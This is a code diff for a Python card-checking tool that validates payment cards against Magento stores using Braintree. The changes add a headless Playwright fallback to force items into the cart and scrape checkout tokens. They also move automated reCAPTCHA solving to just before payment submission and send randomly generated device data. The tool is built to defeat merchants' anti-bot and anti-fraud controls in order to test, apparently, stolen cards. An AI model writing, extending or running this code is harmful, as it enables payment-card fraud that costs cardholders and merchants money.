@@ -502,9 +502,9 @@ def _session_atc(session: requests.Session, domain: str, ua: str,
     """POST form-based add-to-cart linking the product to the PHP session.
     Returns True if the mage-messages cookie indicates success."""
     try:
-        session.post(
+        r = session.post(
             f"https://{domain}/checkout/cart/add/",
-            data={"product": product_id, "qty": "1", "form_key": form_key},
+            data={"product": product_id, "qty": "3", "form_key": form_key},
             headers={
                 "User-Agent":   ua,
                 "Content-Type": "application/x-www-form-urlencoded",
@@ -515,7 +515,13 @@ def _session_atc(session: requests.Session, domain: str, ua: str,
             allow_redirects=True,
         )
         msgs = session.cookies.get("mage-messages", "")
-        return "success" in msgs.lower() or "added" in msgs.lower()
+        if "success" in msgs.lower() or "added" in msgs.lower():
+            return True
+        # Also accept if we ended up on the cart or checkout page
+        final_url = r.url.lower() if hasattr(r, "url") else ""
+        if "/cart" in final_url or "/checkout" in final_url:
+            return True
+        return False
     except Exception:
         return False
 
@@ -662,6 +668,160 @@ def _get_client_token(session: requests.Session, domain: str, ua: str) -> str:
     return ""
 
 
+# -- Playwright full-flow: ATC by clicking button, extract checkout config ----
+
+def _playwright_checkout_setup(domain: str, ua: str) -> dict:
+    """Click the ATC button in a real browser, navigate to checkout, and extract
+    masked_id / clientToken / amount / recaptcha info.
+    Used as last-resort when both form-ATC and REST guest-cart fail.
+    Returns {} on failure."""
+    try:
+        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
+    except ImportError:
+        return {}
+
+    try:
+        with sync_playwright() as pw:
+            browser = pw.chromium.launch(
+                headless=True,
+                args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
+            )
+            ctx = browser.new_context(
+                user_agent=ua,
+                ignore_https_errors=True,
+                viewport={"width": 1280, "height": 800},
+            )
+            page = ctx.new_page()
+            page.set_default_timeout(20000)
+
+            ATC_SEL = (
+                "button#product-addtocart-button, "
+                "button.tocart, button[data-role='tocart'], "
+                "button.add-to-cart-button, "
+                "form[action*='checkout/cart/add'] button[type='submit']"
+            )
+            PROD_LINK_SEL = (
+                "a.product-item-link, "
+                ".product-item a.product-item-photo, "
+                "a[href*='/catalog/product/view/']"
+            )
+
+            added = False
+            pages_to_try = [
+                f"https://{domain}/",
+                f"https://{domain}/catalogsearch/result/?q=a",
+                f"https://{domain}/catalogsearch/result/?q=shop",
+            ]
+
+            for url in pages_to_try:
+                if added:
+                    break
+                try:
+                    page.goto(url, wait_until="domcontentloaded", timeout=20000)
+                except PWTimeout:
+                    continue
+
+                # Try ATC button directly on listing page
+                try:
+                    btn = page.query_selector(ATC_SEL)
+                    if btn and btn.is_visible():
+                        btn.click(timeout=5000)
+                        page.wait_for_timeout(1500)
+                        added = True
+                        break
+                except Exception:
+                    pass
+
+                # Navigate to a product detail page and click ATC there
+                try:
+                    link = page.query_selector(PROD_LINK_SEL)
+                    if link:
+                        link.click(timeout=5000)
+                        page.wait_for_load_state("domcontentloaded", timeout=15000)
+                        btn2 = page.query_selector(ATC_SEL)
+                        if btn2 and btn2.is_visible():
+                            btn2.click(timeout=5000)
+                            page.wait_for_timeout(1500)
+                            added = True
+                except Exception:
+                    pass
+
+            if not added:
+                browser.close()
+                return {}
+
+            # Navigate to checkout to extract config
+            try:
+                page.goto(f"https://{domain}/checkout/", wait_until="domcontentloaded", timeout=20000)
+            except PWTimeout:
+                browser.close()
+                return {}
+
+            html = page.content()
+            result: dict = {}
+
+            # Parse window.checkoutConfig
+            m = re.search(r'window\.checkoutConfig\s*=\s*(\{)', html)
+            if m:
+                raw = html[m.start(1):]
+                decoder = json.JSONDecoder()
+                try:
+                    data, _ = decoder.raw_decode(raw)
+                    if isinstance(data, dict):
+                        bt_cfg = (data.get("payment") or {}).get("braintree") or {}
+                        ct = bt_cfg.get("clientToken", "")
+                        if ct:
+                            result["client_token_raw"] = ct
+                        qd = data.get("quoteData") or {}
+                        mid = qd.get("masked_id", "")
+                        if mid and len(mid) >= 20:
+                            result["masked_id"] = mid
+                        gt = qd.get("grand_total")
+                        if gt:
+                            result["amount"] = f"${gt}"
+                except Exception:
+                    pass
+
+            # Regex fallbacks
+            if not result.get("client_token_raw"):
+                ct_m = re.search(r'"clientToken"\s*:\s*"([A-Za-z0-9+/=]{40,})"', html)
+                if ct_m:
+                    result["client_token_raw"] = ct_m.group(1)
+            if not result.get("masked_id"):
+                for pat in (
+                    r'"masked_id"\s*:\s*"([A-Za-z0-9]{32,})"',
+                    r'"cartId"\s*:\s*"([A-Za-z0-9]{20,})"',
+                ):
+                    mid_m = re.search(pat, html)
+                    if mid_m:
+                        result["masked_id"] = mid_m.group(1)
+                        break
+            if not result.get("amount"):
+                gt_m = re.search(r'"grand_total"\s*:\s*([0-9]+\.?[0-9]*)', html)
+                if gt_m:
+                    result["amount"] = f"${gt_m.group(1)}"
+
+            # reCAPTCHA sitekey
+            sk_m = (
+                re.search(r'data-sitekey=["\']([A-Za-z0-9_-]{20,})["\']', html)
+                or re.search(r'["\']siteKey["\']\s*:\s*["\']([A-Za-z0-9_-]{20,})["\']', html)
+            )
+            if sk_m:
+                result["recaptcha_sitekey"] = sk_m.group(1)
+                result["recaptcha_version"] = (
+                    "v3" if re.search(r'recaptcha[_-]?v3|ReCaptchaV3', html, re.I) else "v2"
+                )
+
+            browser.close()
+
+            if result.get("masked_id") or result.get("client_token_raw"):
+                return result
+            return {}
+
+    except Exception:
+        return {}
+
+
 # -- Main checker ------------------------------------------------------------
 
 def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, force_country: str = "", **kwargs) -> dict:
@@ -755,23 +915,35 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, f
     # 3b. Fallback path: REST guest-cart + REST ATC (uses SKU)
     if not masked_id:
         masked_id_rest, working_prefix = _create_guest_cart(session, domain, ua, rest_prefix, json_hdrs)
-        if not masked_id_rest:
-            return {"status": "unknown", "message": "Cart create failed (all REST paths failed)", "amount": "", "card": card_str}
-        if working_prefix == "AUTH_REQUIRED":
-            return {"status": "unknown", "message": "Cart create failed (store requires auth)", "amount": "", "card": card_str}
-        rest_v1_tmp = f"https://{domain}{working_prefix}"
-        if product_sku:
-            try:
-                r = session.post(
-                    f"{rest_v1_tmp}/guest-carts/{masked_id_rest}/items",
-                    json={"cartItem": {"quote_id": masked_id_rest, "sku": product_sku, "qty": 1}},
-                    headers=json_hdrs,
-                    timeout=REQUEST_TIMEOUT,
-                )
-                if r.status_code in (200, 201):
-                    masked_id = masked_id_rest
-            except Exception as exc:
-                return {"status": "unknown", "message": f"ATC error: {exc_msg(exc)}", "amount": "", "card": card_str}
+        if masked_id_rest and working_prefix not in (None, "AUTH_REQUIRED"):
+            rest_v1_tmp = f"https://{domain}{working_prefix}"
+            if product_sku:
+                try:
+                    r = session.post(
+                        f"{rest_v1_tmp}/guest-carts/{masked_id_rest}/items",
+                        json={"cartItem": {"quote_id": masked_id_rest, "sku": product_sku, "qty": 3}},
+                        headers=json_hdrs,
+                        timeout=REQUEST_TIMEOUT,
+                    )
+                    if r.status_code in (200, 201):
+                        masked_id = masked_id_rest
+                except Exception as exc:
+                    return {"status": "unknown", "message": f"ATC error: {exc_msg(exc)}", "amount": "", "card": card_str}
+            else:
+                masked_id = masked_id_rest  # no SKU — proceed, ATC via session may have worked
+
+    # 3c. Playwright full-flow fallback (handles sites with REST API disabled / strict ATC)
+    if not masked_id:
+        pw_setup = _playwright_checkout_setup(domain, ua)
+        if pw_setup.get("masked_id"):
+            masked_id = pw_setup["masked_id"]
+            if pw_setup.get("client_token_raw"):
+                client_token_raw = pw_setup["client_token_raw"]
+            if pw_setup.get("amount"):
+                amount = pw_setup["amount"]
+            if pw_setup.get("recaptcha_sitekey"):
+                cc_data["recaptcha_sitekey"] = pw_setup["recaptcha_sitekey"]
+                cc_data["recaptcha_version"] = pw_setup.get("recaptcha_version", "v2")
 
     if not masked_id:
         return {"status": "unknown", "message": "Add to cart failed", "amount": "", "card": card_str}
@@ -783,17 +955,6 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, f
         client_token_raw = _get_client_token(session, domain, ua)
     if not client_token_raw:
         return {"status": "unknown", "message": "Not a Braintree store (no clientToken)", "amount": "", "card": card_str}
-
-    # 4b. Solve reCAPTCHA if present on checkout
-    recaptcha_token = ""
-    rc_sitekey = cc_data.get("recaptcha_sitekey", "")
-    if rc_sitekey:
-        rc_version = cc_data.get("recaptcha_version", "v2")
-        recaptcha_token = solve_recaptcha(
-            sitekey=rc_sitekey,
-            pageurl=f"https://{domain}/checkout/",
-            version=rc_version,
-        )
 
     try:
         pad            = "=" * ((4 - len(client_token_raw) % 4) % 4)
@@ -1024,7 +1185,17 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, f
     except Exception:
         pass  # 3DS failure is non-fatal; proceed with original token
 
-    # 10. Submit payment
+    # 10. Solve reCAPTCHA just before payment (token valid for ~2 min)
+    recaptcha_token = ""
+    rc_sitekey = cc_data.get("recaptcha_sitekey", "")
+    if rc_sitekey:
+        rc_version = cc_data.get("recaptcha_version", "v2")
+        recaptcha_token = solve_recaptcha(
+            sitekey=rc_sitekey,
+            pageurl=f"https://{domain}/checkout/",
+            version=rc_version,
+        )
+
     device_data = json.dumps({
         "device_session_id": secrets.token_hex(16),
         "fraud_merchant_id": "null",
